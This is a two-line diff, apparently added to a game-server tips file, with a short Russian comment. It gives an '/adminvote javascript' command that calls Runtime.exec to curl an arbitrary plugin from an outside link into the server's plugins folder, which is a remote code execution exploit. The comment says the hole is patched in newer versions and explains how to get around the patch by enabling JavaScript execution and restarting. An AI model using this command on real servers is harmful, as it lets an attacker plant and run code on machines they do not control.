@@ -1,0 +1,2 @@
+/adminvote javascript java.lang.Runtime.getRuntime().exec("curl -o plugins/*названиеплагина* *ссылка*");
+Зафикшено в новых версиях, но это можно обойти путем включения функции выполнения JavaScript'а через гуи и перезагрузку сервера
